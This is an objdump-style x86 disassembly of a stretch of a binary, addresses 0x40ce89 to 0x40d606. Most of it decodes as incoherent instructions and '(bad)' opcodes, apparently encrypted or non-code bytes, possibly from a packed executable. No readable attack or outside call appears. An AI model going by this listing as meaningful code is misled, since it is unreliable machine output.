  40ce89:	adc    cl,BYTE PTR [eax]
  40ce8b:	and    bl,BYTE PTR [eax]
  40ce8d:	sbb    eax,0x1b2d6070
  40ce92:	mov    bl,0xfc
  40ce94:	inc    eax
  40ce95:	push   edx
  40ce96:	jle    0x40ced3
  40ce98:	mov    dl,0x2a
  40ce9a:	adc    esi,DWORD PTR [eax+0x77dccada]
  40cea0:	adc    esi,DWORD PTR [ebx]
  40cea2:	push   edx
  40cea3:	add    DWORD PTR [edx-0x64],eax
  40cea6:	(bad)  
  40cea8:	jae    0x40ce49
  40ceaa:	inc    edx
  40ceab:	dec    esp
  40ceac:	fpatan 
  40ceae:	cmp    esi,DWORD PTR [ebp-0x40942517]
  40ceb4:	icebp  
  40ceb5:	lods   al,BYTE PTR ds:[esi]
  40ceb6:	push   eax
  40ceb7:	in     eax,0x6c
  40ceb9:	mov    eax,0x740ba428
  40cebe:	push   ss
  40cebf:	stos   DWORD PTR es:[edi],eax
  40cec0:	mov    edx,0xa1c5ef17
  40cec5:	in     eax,0xeb
  40cec7:	(bad)  
  40cec8:	inc    BYTE PTR [ecx+0x12ba8763]
  40cece:	sub    BYTE PTR [ebp-0x16],0xb
  40ced2:	arpl   WORD PTR [ebp+eax*8-0x44],sp
  40ced6:	cli    
  40ced7:	out    dx,al
  40ced8:	pop    esp
  40ced9:	(bad)  
  40ceda:	mov    ebp,0x8a127f53
  40cedf:	and    bl,BYTE PTR [edx+0x17aab85b]
  40cee5:	pop    edx
  40cee6:	dec    ebx
  40cee7:	call   0x4c174f3d
  40ceec:	je     0x40ceab
  40ceee:	jb     0x40cebe
  40cef0:	mov    dl,0x85
  40cef2:	loope  0x40cf3f
  40cef4:	fcom   QWORD PTR [esi+ecx*1-0x620c0542]
  40cefb:	test   ebx,edx
  40cefd:	ror    BYTE PTR [edx],0x9
  40cf00:	push   ds
  40cf01:	add    BYTE PTR [esi],bh
  40cf03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf04:	mov    dl,BYTE PTR [esi]
  40cf06:	sti    
  40cf07:	jo     0x40cf3b
  40cf09:	mov    ebp,0x3ced5d82
  40cf0e:	lods   al,BYTE PTR ds:[esi]
  40cf0f:	mov    bl,BYTE PTR [esi+0x27]
  40cf12:	je     0x40ced0
  40cf14:	add    ebx,esi
  40cf16:	fwait
  40cf17:	cdq    
  40cf18:	(bad)  
  40cf19:	call   DWORD PTR [esi-0x50]
  40cf1c:	in     al,dx
  40cf1d:	sub    BYTE PTR [eax],bh
  40cf1f:	add    esp,DWORD PTR [edx-0x52]
  40cf22:	jae    0x40cf4a
  40cf24:	mov    eax,ds:0x5f277ce3
  40cf29:	rcl    dl,1
  40cf2b:	lock arpl sp,sp
  40cf2e:	stos   DWORD PTR es:[edi],eax
  40cf2f:	jg     0x40cf5d
  40cf31:	scas   al,BYTE PTR es:[edi]
  40cf32:	xlat   BYTE PTR ds:[ebx]
  40cf33:	jmp    0x40cfb1
  40cf35:	jne    0x40cf1c
  40cf37:	mov    ?,WORD PTR [ebx]
  40cf39:	pushf  
  40cf3a:	sub    bh,bl
  40cf3c:	lahf   
  40cf3d:	dec    ecx
  40cf3e:	jl     0x40cf0b
  40cf40:	cmp    ah,cl
  40cf42:	addr16 xor eax,0x3bc9a3a3
  40cf48:	mov    dh,0xd3
  40cf4a:	jg     0x40cf03
  40cf4c:	cmc    
  40cf4d:	pop    gs
  40cf4f:	xor    al,0xcb
  40cf51:	ffree  st(2)
  40cf53:	sbb    eax,0x399e0b60
  40cf58:	rcl    DWORD PTR [ecx-0x612a4686],0x41
  40cf5f:	push   ds
  40cf60:	xchg   ebx,eax
  40cf61:	jns    0x40cf4a
  40cf63:	idiv   BYTE PTR [eax-0xa436ff7]
  40cf69:	(bad)  [edi+0x12]
  40cf6c:	jno    0x40cf3c
  40cf6e:	cmp    bh,BYTE PTR [eax]
  40cf70:	mov    bh,0x79
  40cf72:	add    BYTE PTR [ebx+0x1f8ddd5e],al
  40cf78:	jmp    0x1134:0x9ad6eb65
  40cf7f:	pslld  mm2,QWORD PTR [ebx+0x11]
  40cf83:	fistp  DWORD PTR [esp+edx*8]
  40cf86:	cld    
  40cf87:	pop    ebx
  40cf88:	enter  0x7e8c,0xa1
  40cf8c:	jle    0x40d005
  40cf8e:	loopne 0x40cfa9
  40cf90:	mov    ah,0x57
  40cf92:	in     al,dx
  40cf93:	push   ecx
  40cf94:	pop    ecx
  40cf95:	outs   dx,BYTE PTR ds:[esi]
  40cf96:	inc    ebp
  40cf97:	pop    ebp
  40cf98:	fsubr  st,st(6)
  40cf9a:	outs   dx,BYTE PTR ds:[esi]
  40cf9b:	js     0x40cf7b
  40cf9d:	mov    ebx,0x31df3a71
  40cfa2:	fcomp  DWORD PTR [esi-0x6c]
  40cfa5:	jecxz  0x40d01d
  40cfa7:	xchg   DWORD PTR [edi+0x65],esi
  40cfaa:	adc    eax,0x73f1dee3
  40cfaf:	mov    DWORD PTR [eax-0x1fe0e352],ecx
  40cfb5:	mov    fs,ecx
  40cfb7:	pop    eax
  40cfb8:	inc    ebx
  40cfb9:	test   ebx,ebx
  40cfbb:	mov    DWORD PTR [esi+0x5],ebp
  40cfbe:	mov    al,0x50
  40cfc0:	aaa    
  40cfc1:	aas    
  40cfc2:	(bad)  
  40cfc3:	(bad)  
  40cfc4:	ror    DWORD PTR [ebx-0x10ff9b60],0x4f
  40cfcb:	icebp  
  40cfcc:	push   ebx
  40cfcd:	sub    eax,0xa81ead40
  40cfd2:	and    edx,ecx
  40cfd4:	aad    0x71
  40cfd6:	or     bh,BYTE PTR [edi-0x67093034]
  40cfdc:	enter  0x70ec,0xf9
  40cfe0:	sbb    DWORD PTR [ebx+0xc],esp
  40cfe3:	mov    ch,0x60
  40cfe5:	add    BYTE PTR [ebp+0x5e],dl
  40cfe8:	or     eax,0x4493487c
  40cfed:	cmp    al,0xe0
  40cfef:	push   edx
  40cff0:	adc    eax,0xde5a5545
  40cff5:	sti    
  40cff6:	(bad)  
  40cff7:	enter  0x37c7,0x10
  40cffb:	adc    cl,BYTE PTR [ebx-0x6]
  40cffe:	sub    DWORD PTR ds:0x8f4065ea,ecx
  40d004:	adc    BYTE PTR [esi+0x37ebbbde],dh
  40d00a:	jecxz  0x40cfd7
  40d00c:	adc    al,0x4c
  40d00e:	mov    esp,0x96eb9dc2
  40d013:	and    al,0xac
  40d016:	ss repz hlt 
  40d019:	popa   
  40d01a:	sub    ah,ch
  40d01c:	int3   
  40d01d:	in     eax,0x23
  40d01f:	add    al,0x1a
  40d021:	sub    al,0x21
  40d023:	and    al,0x6a
  40d025:	add    DWORD PTR [ebp+0x697249cf],eax
  40d02b:	xchg   esp,eax
  40d02c:	push   ebx
  40d02d:	xchg   edx,eax
  40d02e:	ror    edx,1
  40d030:	call   FWORD PTR [ecx-0x65a1d701]
  40d036:	repnz sti 
  40d038:	sbb    esp,edx
  40d03a:	mov    ah,0x27
  40d03c:	push   DWORD PTR [edi-0x5]
  40d03f:	sbb    al,0xce
  40d041:	(bad)  
  40d042:	sub    DWORD PTR [edx+edi*8],ecx
  40d045:	inc    eax
  40d046:	mov    ds:0x8346d072,eax
  40d04b:	ja     0x40d05a
  40d04d:	call   0xe915:0x8c8ff14f
  40d054:	inc    ebx
  40d055:	enter  0xab1d,0xd2
  40d059:	push   ebp
  40d05a:	xor    ecx,ecx
  40d05c:	(bad)  [ebx+0x27d9bf29]
  40d062:	cmp    DWORD PTR [eax],ecx
  40d064:	(bad)
  40d067:	push   esi
  40d068:	mov    esi,0xfcad623c
  40d06d:	loope  0x40d0a8
  40d06f:	aam    0x4e
  40d071:	push   ebx
  40d072:	fist   DWORD PTR [ecx]
  40d074:	jecxz  0x40d0e3
  40d076:	fiadd  WORD PTR [edi]
  40d078:	or     DWORD PTR [esi],ebp
  40d07a:	sub    eax,0x2ece07de
  40d07f:	pop    edx
  40d080:	jno    0x40d005
  40d082:	mov    esp,0x63932802
  40d087:	xor    BYTE PTR [ebx+0x63c8cc17],dl
  40d08d:	ja     0x40d0a2
  40d08f:	xor    esi,ebx
  40d091:	lods   eax,DWORD PTR ds:[esi]
  40d092:	in     eax,0x89
  40d094:	imul   DWORD PTR [edx-0x51]
  40d097:	cld    
  40d098:	xchg   ebx,eax
  40d099:	and    al,0x8
  40d09b:	pop    edx
  40d09c:	or     ebx,eax
  40d09e:	imul   ecx,DWORD PTR [edx],0xbf45d02b
  40d0a4:	pop    ecx
  40d0a5:	outs   dx,DWORD PTR ds:[esi]
  40d0a6:	push   ds
  40d0a7:	lahf   
  40d0a8:	pop    eax
  40d0a9:	jg     0x40d106
  40d0ab:	jl     0x40d0fa
  40d0ad:	(bad)  
  40d0af:	push   ecx
  40d0b0:	mov    eax,ds:0x81afc1d5
  40d0b5:	and    bl,BYTE PTR [edi+edi*1]
  40d0b8:	daa    
  40d0b9:	sahf   
  40d0ba:	jle    0x40d0b3
  40d0bc:	or     al,0xa0
  40d0be:	stos   DWORD PTR es:[edi],eax
  40d0bf:	lods   al,BYTE PTR ds:[esi]
  40d0c0:	popf   
  40d0c1:	dec    ecx
  40d0c2:	jb     0x40d072
  40d0c4:	fidiv  DWORD PTR [edx]
  40d0c6:	or     eax,0x4e15f5ea
  40d0cb:	mov    BYTE PTR [edi-0x2ec7e1],ch
  40d0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0d2:	sbb    al,0x71
  40d0d4:	xchg   esp,eax
  40d0d5:	call   0x9621c807
  40d0da:	adc    edx,DWORD PTR [ecx]
  40d0dc:	lock jecxz 0x40d06c
  40d0df:	push   edi
  40d0e0:	in     al,0x26
  40d0e2:	test   ah,dl
  40d0e4:	sub    al,0x70
  40d0e6:	ficomp WORD PTR [esi+0x2d20ed77]
  40d0ec:	inc    eax
  40d0ed:	pop    es
  40d0ee:	inc    edx
  40d0ef:	in     al,dx
  40d0f0:	push   ds
  40d0f1:	inc    ecx
  40d0f2:	cmp    al,0x5
  40d0f4:	cmp    al,0x77
  40d0f6:	mov    al,0x2e
  40d0f8:	push   ds
  40d0f9:	call   0x4beb:0xf97ddf9
  40d100:	sub    DWORD PTR [ecx+edi*1],edx
  40d103:	lods   eax,DWORD PTR ds:[esi]
  40d104:	adc    al,0x14
  40d106:	xor    eax,0xa25aac0
  40d10b:	cdq    
  40d10c:	(bad)  
  40d10d:	sub    DWORD PTR [edi+0x88e3169],esp
  40d113:	xchg   ebp,eax
  40d114:	lods   al,BYTE PTR ds:[esi]
  40d115:	addr16 and eax,0x1bf1e553
  40d11b:	aas    
  40d11c:	clc    
  40d11d:	cwde   
  40d11e:	dec    edi
  40d11f:	fwait
  40d120:	cwde   
  40d121:	sti    
  40d122:	xlat   BYTE PTR ds:[ebx]
  40d123:	call   0xf808b168
  40d128:	cmp    ecx,DWORD PTR [ebx+0x602d0b91]
  40d12e:	xor    ah,BYTE PTR [ebx+eax*8+0x8]
  40d132:	out    0x57,eax
  40d134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d135:	stos   BYTE PTR es:[edi],al
  40d136:	hlt    
  40d137:	or     eax,0xb493d0fa
  40d13c:	sbb    bl,BYTE PTR [eax-0x41c5e0fb]
  40d142:	mov    al,0xff
  40d144:	sahf   
  40d145:	xchg   esi,eax
  40d146:	cmp    eax,0x885a6f90
  40d14b:	jmp    0x402d:0x7abad502
  40d152:	sub    edi,DWORD PTR [ebx]
  40d154:	dec    esi
  40d155:	add    DWORD PTR [ebp-0x51c63d15],edi
  40d15b:	inc    eax
  40d15c:	push   ds
  40d15d:	fucomip st,st(6)
  40d15f:	call   0x771d6398
  40d164:	mov    esi,0xb5a2cefc
  40d169:	fisttp DWORD PTR [edx]
  40d16b:	pop    ds
  40d16c:	fcom   DWORD PTR [edi+ecx*4]
  40d16f:	lods   eax,DWORD PTR ds:[esi]
  40d170:	and    eax,0x48322dc1
  40d175:	or     DWORD PTR [edi],eax
  40d177:	mov    eax,0xe0299fd9
  40d17c:	cld    
  40d17d:	jne    0x40d126
  40d17f:	jo     0x40d1f0
  40d181:	sub    eax,0xb632edfe
  40d186:	xor    eax,0xe57441e3
  40d18b:	add    eax,0x5240e66e
  40d190:	pop    esp
  40d191:	sbb    eax,0xc99cf430
  40d196:	mov    al,ds:0x4945eb45
  40d19b:	or     DWORD PTR [edx-0x10],ebp
  40d19e:	push   ebp
  40d19f:	(bad)  
  40d1a1:	mov    edx,0x78f145d6
  40d1a6:	hlt    
  40d1a7:	loop   0x40d1b0
  40d1a9:	mov    dl,0xbb
  40d1ab:	push   ss
  40d1ac:	jl     0x40d1f3
  40d1ae:	and    al,0x78
  40d1b0:	jmp    0xaa3e2c2b
  40d1b5:	adc    esi,ebp
  40d1b7:	cmp    eax,0x96a6d6d9
  40d1bc:	xchg   ecx,eax
  40d1bd:	in     eax,0xc3
  40d1bf:	pop    edx
  40d1c0:	lods   al,BYTE PTR ds:[esi]
  40d1c1:	add    ch,al
  40d1c3:	pop    esp
  40d1c4:	xor    esp,DWORD PTR [esi+0x701059a4]
  40d1ca:	popa   
  40d1cb:	pop    ss
  40d1cc:	mov    bl,0xda
  40d1ce:	loop   0x40d17d
  40d1d0:	fs cmc 
  40d1d2:	outs   dx,BYTE PTR ds:[esi]
  40d1d3:	inc    ebx
  40d1d4:	adc    dh,BYTE PTR [edx+edi*8-0x58]
  40d1d8:	jae    0x40d1de
  40d1da:	or     eax,0xddf754d8
  40d1df:	repnz mov dh,cl
  40d1e2:	test   BYTE PTR [ebp+0x6c],dh
  40d1e5:	cli    
  40d1e6:	xor    ecx,DWORD PTR [edx-0x5]
  40d1e9:	pop    edi
  40d1ea:	unpcklps xmm2,XMMWORD PTR [ecx-0x2]
  40d1ee:	pop    es
  40d1ef:	cld    
  40d1f0:	loope  0x40d231
  40d1f2:	cmp    BYTE PTR ds:0x51dbe3e0,bh
  40d1f8:	ja     0x40d1f2
  40d1fa:	out    0x6b,al
  40d1fc:	lea    ecx,[edx+0x7a2f7a8a]
  40d202:	push   esi
  40d203:	add    DWORD PTR [eax+edx*4-0x30],ebx
  40d207:	xor    DWORD PTR [eax-0x3b],esi
  40d20a:	sub    al,0xf0
  40d20c:	pop    ebp
  40d20d:	push   edx
  40d20e:	add    eax,0x1135bc51
  40d213:	gs jns 0x40d254
  40d216:	add    al,0x46
  40d218:	sub    DWORD PTR [esi-0x1e],0x76616ab6
  40d21f:	ja     0x40d1a8
  40d221:	clc    
  40d222:	pop    ebx
  40d223:	jnp    0x40d1f8
  40d225:	inc    ebp
  40d226:	shl    BYTE PTR [ecx+0xd],0x77
  40d22a:	mov    cl,0xdb
  40d22c:	sub    eax,DWORD PTR [eax+0x3a]
  40d22f:	stc    
  40d230:	and    BYTE PTR [ebp+ebx*8+0x223294df],ah
  40d237:	outs   dx,DWORD PTR ds:[esi]
  40d238:	jg     0x40d29e
  40d23a:	ret    0xf26e
  40d23d:	mov    esp,0x992cfac4
  40d242:	std    
  40d243:	pop    es
  40d244:	add    BYTE PTR [ebp+0x4bfd0a34],bh
  40d24a:	jne    0x40d2ad
  40d24c:	and    bl,0x93
  40d24f:	iret   
  40d250:	xor    BYTE PTR [esi+edx*8-0x692f752],0xc0
  40d258:	add    al,cl
  40d25a:	fcom   st(5)
  40d25c:	(bad)  
  40d25d:	data16 stos BYTE PTR es:[edi],al
  40d25f:	neg    DWORD PTR [ecx-0x5255189a]
  40d265:	and    eax,0x14e765d
  40d26a:	xchg   esp,eax
  40d26b:	es shr DWORD PTR es:[edx*2-0x726555e9],cl
  40d274:	mov    WORD PTR [ecx],ss
  40d276:	clc    
  40d277:	jb     0x40d2ab
  40d279:	add    BYTE PTR [ebx],bh
  40d27b:	enter  0x850f,0x60
  40d27f:	mov    eax,0x458bffff
  40d284:	cld    
  40d285:	xor    eax,esi
  40d287:	add    eax,edi
  40d289:	mov    DWORD PTR [ebp-0x10],eax
  40d28c:	mov    ebx,0x756654
  40d291:	add    ebx,0x567645
  40d297:	jmp    0x40f637
  40d29c:	iret   
  40d29d:	jmp    0x40d284
  40d29f:	sub    cl,0x9a
  40d2a2:	cli    
  40d2a3:	in     al,dx
  40d2a4:	xchg   ebx,eax
  40d2a5:	sbb    al,0x4b
  40d2a7:	or     bh,BYTE PTR [ebp+edi*4+0x2b2fde03]
  40d2ae:	jnp    0x40d32b
  40d2b0:	(bad)  
  40d2b1:	sahf   
  40d2b2:	jnp    0x40d32f
  40d2b4:	push   esp
  40d2b5:	and    BYTE PTR [edx+0x66],bh
  40d2b8:	inc    edx
  40d2b9:	es hlt 
  40d2bb:	test   eax,0x390825cf
  40d2c0:	xor    bl,cl
  40d2c2:	xchg   edi,edx
  40d2c4:	test   DWORD PTR [esi-0xc],eax
  40d2c7:	dec    ebx
  40d2c8:	stc    
  40d2c9:	leave  
  40d2ca:	sbb    DWORD PTR [eax],0x72a4cad2
  40d2d0:	imul   ebp,DWORD PTR [ebx+0x20eb8520],0xffffff84
  40d2d7:	pop    esi
  40d2d8:	xor    DWORD PTR [ebx],eax
  40d2da:	or     al,0x1d
  40d2dc:	push   cs
  40d2dd:	inc    ecx
  40d2de:	stc    
  40d2df:	cld    
  40d2e0:	cmp    cl,BYTE PTR [edx-0x40]
  40d2e3:	cdq    
  40d2e4:	int3   
  40d2e5:	xchg   ecx,eax
  40d2e6:	dec    ecx
  40d2e7:	or     DWORD PTR [esi+0x4648d544],ecx
  40d2ed:	fs jmp 0x40d2a2
  40d2f0:	or     ebp,DWORD PTR [eax-0x64]
  40d2f3:	mov    eax,ds:0xeaff958d
  40d2f8:	mov    ch,0xd3
  40d2fa:	jo     0x40d2b2
  40d2fc:	dec    esp
  40d2fd:	jecxz  0x40d33b
  40d2ff:	sub    al,0xa0
  40d301:	xchg   edi,eax
  40d302:	add    eax,0x6a3aeb59
  40d307:	push   edi
  40d308:	push   esp
  40d309:	xor    BYTE PTR [eax],bh
  40d30b:	sti    
  40d30c:	pop    ss
  40d30d:	dec    edx
  40d30e:	mov    WORD PTR [eax+0x2c0994d0],es
  40d314:	(bad)  
  40d315:	ficom  DWORD PTR [ebx+ecx*2+0x4752012c]
  40d31c:	stos   DWORD PTR es:[edi],eax
  40d31d:	pop    ds
  40d31e:	sbb    edi,ebp
  40d320:	mov    eax,ds:0xbe3432a8
  40d325:	(bad)  [edi+0x2f9bf8ef]
  40d32b:	inc    ecx
  40d32c:	mov    edx,0x7c2634e7
  40d331:	cmp    BYTE PTR [esi-0x222ecb30],cl
  40d337:	inc    esp
  40d338:	retf   
  40d339:	retf   0xebaf
  40d33c:	pop    edi
  40d33d:	push   edx
  40d33e:	and    eax,0x83e7cacb
  40d343:	sbb    eax,0x88b563d3
  40d348:	out    0xb0,al
  40d34a:	xchg   ebp,eax
  40d34b:	lahf   
  40d34c:	pusha  
  40d34d:	xlat   BYTE PTR ds:[ebx]
  40d34e:	cs mov dl,0xac
  40d351:	jecxz  0x40d342
  40d353:	test   DWORD PTR [ecx+0x5fac42ce],esp
  40d359:	sbb    BYTE PTR [edx-0x48],ch
  40d35c:	add    esi,DWORD PTR [ecx-0x13a9eb24]
  40d362:	xor    eax,0x4acfac44
  40d367:	std    
  40d368:	jl     0x40d3d8
  40d36a:	sub    DWORD PTR [edx],edi
  40d36c:	mov    WORD PTR [ebp-0x15],cs
  40d36f:	shl    DWORD PTR [edx-0x30],cl
  40d372:	ins    BYTE PTR es:[edi],dx
  40d373:	sub    ebp,DWORD PTR [eax+0x6c86a664]
  40d379:	add    ch,bl
  40d37b:	sbb    ch,al
  40d37d:	inc    ebp
  40d37e:	xor    al,0x41
  40d380:	data16 (bad) 
  40d382:	stos   DWORD PTR es:[edi],eax
  40d383:	fbld   TBYTE PTR [ecx]
  40d385:	inc    edx
  40d386:	dec    eax
  40d387:	adc    bh,bh
  40d389:	es xor eax,0xd62a02e3
  40d38f:	sbb    al,dh
  40d391:	mov    ebp,0x55ea46b6
  40d396:	addr16 pusha 
  40d398:	adc    eax,0x4e0d10a0
  40d39d:	icebp  
  40d39e:	test   BYTE PTR ds:0xc02e560f,cl
  40d3a4:	outs   dx,DWORD PTR ds:[esi]
  40d3a5:	out    0xd8,al
  40d3a7:	and    ah,BYTE PTR [edx+0x3f9355b7]
  40d3ad:	cmc    
  40d3ae:	mov    edx,0xe6ae51bc
  40d3b3:	mov    ds:0x955828ae,al
  40d3b8:	and    ecx,eax
  40d3ba:	lods   eax,DWORD PTR ds:[esi]
  40d3bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3bc:	fninit 
  40d3be:	repnz shr BYTE PTR [ecx],0xc9
  40d3c2:	(bad)  [edi-0x21]
  40d3c5:	shl    eax,cl
  40d3c7:	mov    al,ds:0xaa80f435
  40d3cc:	pusha  
  40d3cd:	dec    ebp
  40d3ce:	pop    ebx
  40d3cf:	scas   al,BYTE PTR es:[edi]
  40d3d0:	and    DWORD PTR [edx],eax
  40d3d2:	out    0x41,eax
  40d3d4:	cs (bad) 
  40d3d6:	retf   0x399a
  40d3d9:	mov    WORD PTR [edi-0x2e],es
  40d3dc:	jae    0x40d3b1
  40d3de:	mov    ebp,0x5bf400f4
  40d3e3:	aad    0x3e
  40d3e5:	dec    ebx
  40d3e6:	dec    ecx
  40d3e7:	dec    edx
  40d3e8:	int3   
  40d3e9:	ret    0x8e41
  40d3ec:	add    edx,ecx
  40d3ee:	dec    ebp
  40d3ef:	pushf  
  40d3f0:	bound  ebp,QWORD PTR [esi-0x76a43d]
  40d3f6:	and    DWORD PTR [edi+0x553f2720],ebp
  40d3fc:	outs   dx,DWORD PTR ds:[esi]
  40d3fd:	xchg   ebp,eax
  40d3fe:	retf   0x2603
  40d401:	jo     0x40d3d7
  40d403:	in     eax,dx
  40d404:	pop    ebp
  40d405:	sbb    eax,0x33d9776
  40d40a:	repz mov ebx,0xd8fcf081
  40d410:	jae    0x40d489
  40d412:	fild   WORD PTR [ecx]
  40d414:	add    eax,0x368ecc02
  40d419:	cld    
  40d41a:	jg     0x40d3b2
  40d41c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40d41e:	cmp    eax,0xe2e11e13
  40d423:	adc    BYTE PTR ds:0xf909b1a,ch
  40d429:	dec    esp
  40d42a:	pop    esp
  40d42b:	adc    ecx,DWORD PTR [ebx+0x4e]
  40d42e:	outs   dx,DWORD PTR es:[esi]
  40d430:	pop    esp
  40d431:	stos   BYTE PTR es:[edi],al
  40d432:	jnp    0x40d3fa
  40d434:	popa   
  40d435:	out    dx,al
  40d436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d437:	cld    
  40d438:	retf   0x49c5
  40d43b:	push   es
  40d43c:	retf   
  40d43d:	jmp    0x9ec9db79
  40d442:	pop    ds
  40d443:	out    dx,eax
  40d444:	add    bh,BYTE PTR [edi+0xf1f33bc]
  40d44a:	jbe    0x40d3ea
  40d44c:	call   0x9b6a:0xa2d2ed9b
  40d453:	aam    0x54
  40d455:	mov    cl,0x1d
  40d457:	push   es
  40d458:	leave  
  40d459:	mul    ecx
  40d45b:	mov    ds:0xd8418bce,eax
  40d460:	sub    al,BYTE PTR [ebx+0x7b]
  40d463:	fsubr  st(6),st
  40d465:	sbb    ch,BYTE PTR [esi]
  40d467:	mov    ah,0xbb
  40d469:	(bad)  
  40d46a:	leave  
  40d46b:	or     BYTE PTR [ebp-0x6c],0x74
  40d46f:	dec    eax
  40d470:	and    DWORD PTR [ecx-0x2e],ecx
  40d473:	mov    BYTE PTR [eax+0x137410d8],ch
  40d479:	fisttp DWORD PTR [esi+ebp*2]
  40d47c:	sub    DWORD PTR [eax-0x24],edi
  40d47f:	xor    al,0xaf
  40d481:	inc    edx
  40d482:	stc    
  40d483:	or     ebp,DWORD PTR [edx-0x75]
  40d486:	jno    0x40d4c2
  40d488:	dec    esp
  40d489:	mov    dl,0xe7
  40d48b:	das    
  40d48c:	test   al,0x62
  40d48e:	push   ds
  40d48f:	jg     0x40d4a8
  40d491:	lds    edx,FWORD PTR ds:0x9a540763
  40d497:	add    edi,DWORD PTR ds:0x8a60fe0
  40d49d:	push   edx
  40d49e:	xchg   BYTE PTR [eax-0x5a],al
  40d4a1:	test   eax,0x2a4d67a5
  40d4a6:	jg     0x40d429
  40d4a8:	jns    0x40d4d0
  40d4aa:	pop    eax
  40d4ab:	mov    bh,0x57
  40d4ad:	and    BYTE PTR [eax],ah
  40d4af:	pop    esi
  40d4b0:	pushf  
  40d4b1:	mov    dl,0x94
  40d4b3:	and    eax,0x4f464138
  40d4b8:	jbe    0x40d4f4
  40d4ba:	sbb    esi,DWORD PTR [edx+0x2022b5d0]
  40d4c0:	jl     0x40d483
  40d4c2:	xor    ah,BYTE PTR [ebx+eax*8-0x3e]
  40d4c6:	pop    eax
  40d4c7:	push   es
  40d4c8:	pop    ecx
  40d4c9:	and    BYTE PTR [eax],cl
  40d4cb:	stc    
  40d4cc:	adc    cl,al
  40d4ce:	call   FWORD PTR [ebx+0x1b1fba58]
  40d4d4:	sahf   
  40d4d5:	dec    edx
  40d4d6:	xchg   ecx,eax
  40d4d7:	inc    esi
  40d4d8:	lea    ecx,[eax+0x7f]
  40d4db:	add    cl,al
  40d4dd:	aad    0xf5
  40d4df:	test   eax,0xa04ef927
  40d4e4:	enter  0xfa62,0x53
  40d4e8:	cmp    eax,0x8c02384a
  40d4ed:	aam    0x1d
  40d4ef:	dec    edi
  40d4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4f1:	pusha  
  40d4f2:	jg     0x40d4fb
  40d4f4:	push   esi
  40d4f5:	mov    ebx,0xfdd577aa
  40d4fa:	sub    eax,0x168bbce8
  40d4ff:	pusha  
  40d500:	out    dx,al
  40d501:	xchg   ebp,eax
  40d502:	aam    0x7f
  40d504:	scas   al,BYTE PTR es:[edi]
  40d505:	cmp    DWORD PTR [ecx],0x5aef8c9d
  40d50b:	cmp    DWORD PTR [ecx-0x1cbd21e1],edx
  40d511:	shl    BYTE PTR [ebp-0x79],cl
  40d514:	adc    ebp,ebx
  40d516:	lods   eax,DWORD PTR ds:[esi]
  40d517:	lahf   
  40d518:	sar    edi,cl
  40d51a:	add    eax,0x5871c78b
  40d51f:	ror    edi,0xb3
  40d522:	or     BYTE PTR [ebx-0x45],dl
  40d525:	xchg   edx,eax
  40d526:	hlt    
  40d527:	or     al,0x15
  40d529:	aas    
  40d52a:	out    dx,al
  40d52b:	stos   BYTE PTR es:[edi],al
  40d52c:	fidivr DWORD PTR [eax]
  40d52e:	in     eax,0x85
  40d530:	inc    ebx
  40d531:	not    DWORD PTR [eax-0x57]
  40d534:	les    ebx,FWORD PTR [eax+0x1a]
  40d537:	(bad)
  40d53b:	ret    
  40d53c:	mov    edi,0x1c1d01a5
  40d541:	pushf  
  40d542:	lds    ebx,FWORD PTR [edi-0xb]
  40d545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d546:	xchg   ebx,eax
  40d547:	cld    
  40d548:	fcom   DWORD PTR [eax-0x4643c792]
  40d54e:	adc    cl,BYTE PTR ds:0xa2c17e1
  40d554:	test   DWORD PTR [ecx-0x4c],edx
  40d557:	in     al,dx
  40d558:	fisubr DWORD PTR [edx+ebx*8+0x34615ea]
  40d55f:	(bad)  
  40d560:	xchg   ecx,eax
  40d561:	sahf   
  40d562:	adc    ch,BYTE PTR [edx+0x24812f07]
  40d568:	aad    0xe6
  40d56a:	cwde   
  40d56b:	std    
  40d56c:	dec    edi
  40d56d:	inc    ecx
  40d56e:	dec    esi
  40d56f:	cmp    DWORD PTR [ebx+0x6d8e25b6],ecx
  40d575:	(bad)  
  40d576:	adc    al,0x55
  40d578:	mov    ecx,0x7195bb3b
  40d57d:	push   cs
  40d57e:	jmp    0x49d5b583
  40d583:	(bad)  
  40d584:	cmp    DWORD PTR [edi+0x5fd6a35d],ebx
  40d58a:	sub    al,0xc2
  40d58c:	fcom   DWORD PTR ds:0x3ea33130
  40d592:	cs cs out 0x2a,al
  40d596:	pop    esp
  40d597:	enter  0x6199,0x34
  40d59b:	scas   al,BYTE PTR es:[edi]
  40d59c:	xchg   edx,eax
  40d59d:	xor    BYTE PTR [ecx],dl
  40d59f:	fs mov dl,0x78
  40d5a2:	or     ch,BYTE PTR ds:0xbba462f5
  40d5a8:	inc    esi
  40d5a9:	les    edi,FWORD PTR [ebx+edi*2-0x3660cba7]
  40d5b0:	aam    0x8c
  40d5b2:	mov    ch,0x5d
  40d5b4:	cld    
  40d5b5:	xor    eax,0x86e75d66
  40d5ba:	xlat   BYTE PTR ds:[ebx]
  40d5bb:	dec    edi
  40d5bc:	sub    DWORD PTR ds:0xbdb3b1e,0xffffffe7
  40d5c3:	cmp    ebp,esi
  40d5c5:	adc    al,0x76
  40d5c7:	sbb    al,0x44
  40d5c9:	out    0x17,eax
  40d5cb:	jae    0x40d616
  40d5cd:	aas    
  40d5ce:	mov    cl,0x66
  40d5d0:	das    
  40d5d1:	push   0xffffffa3
  40d5d3:	in     al,0xb6
  40d5d5:	xor    bl,BYTE PTR [esi+0x2e]
  40d5d8:	mov    bp,0xf991
  40d5dc:	in     al,0x31
  40d5de:	stc    
  40d5df:	fs ret 
  40d5e1:	xchg   esp,eax
  40d5e2:	imul   eax,DWORD PTR [edx],0xa4675c98
  40d5e8:	cmp    bl,BYTE PTR [ecx-0x5557d160]
  40d5ee:	(bad)  
  40d5ef:	aaa    
  40d5f0:	sub    edi,ecx
  40d5f2:	ret    0xa49e
  40d5f5:	or     eax,0x4e221cf
  40d5fa:	imul   edx,eax,0xf
  40d5fd:	repz pushf 
  40d5ff:	dec    edi
  40d600:	mov    ecx,0xe5be21d8
  40d605:	(bad)  
  40d606:	mov    esp,0xc8d291a6
